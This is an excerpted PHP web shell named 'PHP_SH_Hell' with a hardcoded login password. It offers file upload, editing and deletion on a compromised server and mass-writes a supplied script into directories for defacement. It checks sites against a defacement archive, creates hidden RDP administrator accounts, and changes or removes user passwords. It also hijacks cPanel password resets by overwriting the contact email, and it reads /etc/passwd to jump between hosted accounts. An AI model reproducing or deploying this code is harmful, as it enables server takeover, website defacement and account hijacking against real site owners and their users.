...
$global_password = 'ggwp'; // Password Default: ggwp
...
<html>
<head>
    <title>{ PHP_SH_Hell }</title>
    <link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css' />
    <style type='text/css'>
        body{ font-family: 'Source Sans Pro'; background: black; margin 0; color: white; }
        .pause{ margin: 0 auto; width: 100%; }
        table { margin: auto; font-family: \"Lucida Sans Unicode\", \"Lucida Grande\", \"Segoe Ui\"; font-size: 15px; width: 100%; }
        th{ background-color: #302F2F; }
        td{border-bottom: 1px dashed #00008B; background-color: black; padding: 90 11px; }
        .t{ text-align: center; }
        tr:hover td{ background-color: red; }
        .center{ text-align: center; }
        .box{ min-width:50%; border-radius:8px; opacity:1; padding: 10px; box-shadow:1px 1px 25px red; opacity:0.98; }
        .menu{ border:1px solid red; background-color:black; text-align: center; width:80px; padding: 5px; color:white; }
        a{ font-family: 'arial'; color: white; text-decoration: none; margin: 0; }
        a:hover{ color: gold; }
...
echo "<center><font size='6px' color='lavender'>XD PHP_SH_Hell *_*</font><br></center>
    <div class='pause'>
...
echo "
        ...
        <label class='menu'>
            <input  type='file' name='pause_upload[]' onchange='this.form.submit()' multiple> &nbsp;UPLOAD
        </label>
...
if ($_GET['logout'] == 'true') {
    ...
    if ($_GET['action'] == 'rename') {
        ...
        if (!empty($_POST['edit_data'])) {
            $up  = fopen($save, "w");
            $res = fwrite($up, $_POST['edit_data_long']);
            if ($res) {
        ...
        <center><textarea name='edit_data_long' cols=100% rows=30%>$cont</textarea><br><br>
        <input type='submit' name='edit_data' value='<<<<<<<<[! Save File !]>>>>>>>>'></center>
        </form><br><br>";
        ...
        if (unlink($_GET['delete'])) {
            $del_pause = "<h3 class='center' style='color:#00ff00'>Delete Successfully</h3>";
        } else {
            $del_pause = "<h3 class='center' style='color:red'>Delete Failed</h3>";
        ...
        echo ('<hr>');
        if ($_POST['new_file'] and $_POST['create_file']) {
            $n   = $_POST['new_file'];
            $isi = $_POST['create_file'];
            $b   = @fopen($n, "w");
            $sep = @fwrite($b, $isi);
            if ($sep) {
        ...
        echo "<form method='POST'>
            ...
            <h3>Isi File: </h3><textarea name='create_file' cols='100%' rows='30%' placeholder=\"Isi File\"></textarea></h3><br>
    ...
    if ($_GET['tools'] == 'jumping') {
        ...
        if ($_POST['start']) {
            if ($_POST['type'] == 'mass') {
                ...
                echo "</div>";
            } elseif ($_POST['type'] == 'bias') {
                echo "<div style='margin: 5px auto; padding: 5px'>";
                mass_bias($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
                echo "</div>";
            }
            ...
            echo "<hr>
            <form method='post'>
            <font style='text-decoration: underline;'>Type:</font>
            <input type='radio' name='type' value='bias' checked>Bias<input type='radio' name='type' value='mass'>Massal<br><br>
            ...
            <input type='submit' name='start' value='Go!' style='width: 454px;' class='btn btn-success btn-sm'><br><br>
            </form>";
        }
        ...
        if ($_POST['submit']) {
            ...
            foreach ($domain as $url) {
                ...
                if (preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
                    ...
                    echo "<font color='white'>$url -> </font><font ccolor='red'>ERROR</font><br>";
                }
            }
        } else {
            echo "<center>
...
<input type='SUBMIT' value='GO!' name='option'>
        ...
        if ($_POST['create_rdp']) {
            ...
            if (preg_match("/$user/", $cek)) {
                echo $localhost . $user . " already available<br>";
            } else {
                ...
                if ($cmd_add_user) {
                    echo "# [add user]-> " . $user . " <font color='greenyellow'>SUCCESS</font><br>";
                } else {
                    echo "# [add user]-> " . $user . " <font color='red'>Gagal</font><br>";
                }
                if ($cmd_add_groups1) {
                    echo "# [add localgroup Administrators]-> " . $user . " <font color='greenyellow'>SUCCESS</font><br>";
                } else if ($cmd_add_groups2) {
                    echo "# [add localgroup Administrator]-> " . $user . " <font color='greenyellow'>SUCCESS</font><br>";
                } else if ($cmd_add_groups3) {
                    echo "# [add localgroup Administrateur]-> " . $user . " <font color='greenyellow'>SUCCESS</font><br>";
                } else {
                    echo "# [add localgroup]-> " . $user . " <font color='red'>Gagal</font><br>";
                }
                echo "# [INFO PC]-> RDP IP " . $_SERVER["HTTP_HOST"] . " Username : " . $user . " Password : " . $pass . " <font color='greenyellow'>SUCCESS</font><br>";
            ...
            if ($_POST['action'] == "1") {
                ...
                if (!empty($username)) {
                    if (preg_match("/$username/", $cmd_cek_user)) {
                        ...
                        if ($cmd_add_user) {
                            echo "# [remove user]-> " . $username . " <font color='greenyellow'>SUCCESS</font><br>";
                        } else {
                            echo "# [remove user]-> " . $username . " <font color='red'>ERROR</font><br>";
                        }
                    } else {
                        echo "# [remove user]-> " . $username . " <font color='red'>Not found</font><br>";
                    }
                } else {
                    echo "# [PESAN]-> <font color='red'>Please indicate the username</font><br>";
                }
                ...
                if (!empty($username)) {
                    if (preg_match("/$username/", $cmd_cek_user)) {
                        ...
                        if ($cmd_add_user) {
                            echo "# [change password]-> (" . $username . "|" . $password . ") <font color='greenyellow'>SUCCESS</font><br>";
                        } else {
                            echo "# [change password]-> (" . $username . "|" . $password . ") <font color='red'>ERROR</font><br>";
                        }
                    } else {
                        echo "# [PESAN]-> <font color='red'>Not found</font><br>";
                    }
                } else {
                    echo "# [PESAN]-> <font color='red'>Please indicate the username</font><br>";
                }
    ...
    if (isset($_FILES['pause_upload'])) {
        foreach ($_FILES['pause_upload']['name'] as $key => $val) {
            $name = $_FILES['pause_upload']['name'][$key];
            $tmp  = $_FILES['pause_upload']['tmp_name'][$key];
            if (trim($name) != '') {
                if (move_uploaded_file($tmp, $name)) {
                    $del_pause = '<h3 class="center" style="color:#00ff00">Uploaded ' . $name . ' Successfully</h3><br/>';
                } else {
                    $del_pause = "<h3 class='center' style='color:red'>Failed to Upload " . $name . "</h3><br>";
                }
            }
        }
    }
...
function mass_bias($dir, $namafile, $isi_script)
{
    if (is_writable($dir)) {
        $dira = scandir($dir);
        foreach ($dira as $dirb) {
...
function pause_login()
{
    global $global_password;
    echo "  <title>{ PHP_SH_Hell }</title>
...
";
    session_start();
    if ($_POST['pw'] == $global_password) {
        $_SESSION['login'] = $global_password;
        print "<script>window.location='?';</script>";
    }
    exit;
}
function perms($pause_gan77)
{
    $perms = fileperms($pause_gan77);
...
input[type="email"] { border-radius:5px; border-bottom-color: blue; border-top-color: blue; padding: 10; }
    ...
    $env_addr = getenv('REMOTE_ADDR');
    if (isset($_POST['submit'])) {
        $email        = $_POST['email'];
        $email_keyvalue = 'email:' . $email;
        $dir_path = fopen('/home/' . $curr_user . '/.cpanel/contactinfo', 'w');
        fwrite($dir_path, $email_keyvalue);
        fclose($dir_path);
        $dir_path = fopen('/home/' . $curr_user . '/.contactinfo', 'w');
        fwrite($dir_path, $email_keyvalue);
        fclose($dir_path);
        $url_prefix    = "https://";
        $sock    = "2083";
        $target_url    = $self_host . ':' . $sock . '/resetpass?start=1';
        $read_named_conf = @file('/home/' . $curr_user . '/.cpanel/contactinfo');
        if (!$read_named_conf) {
            echo "<h1>Sorry, it's not easy to access ster</h1><br><br> </pre></center>";
        } else {
            echo "<center>COPY<BR><BR></center>";
            echo '<center><input type="text" value="' . $curr_user . '" id="user"> <button onclick="username()">COPY TEXT</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> ';
            echo '<br/><center><a  target="_blank" href="' . $url_prefix . '' . $target_url . '"></a><br><br></center>';
            ;
        }
    }
}
...
function aksiJump($dir, $ip)
{
    ...
    if (preg_match("/hsphere/", $dir)) {
        ...
        echo "<pre>";
        $etc = fopen("/etc/passwd", "r") or die("<font ccolor='red'>Can't read /etc/passwd</font><br/>");
        while ($passwd = fgets($etc)) {
            if ($passwd == '' || !$etc) {
                echo "<font ccolor='red'>Can't read /etc/passwd</font><br/>";
            } else {
                ...
                foreach ($user_jumping[1] as $user_pro_jump) {
                    ...
                    if (is_readable($user_jumping_dir)) {
                        ...
                        if (function_exists('posix_getpwuid')) {
                            ...
                            if ($domain_jump == '') {
                                echo " => ( <font ccolor='red'>gabisa ambil nama domain nya</font> )<br>";
                            } else {
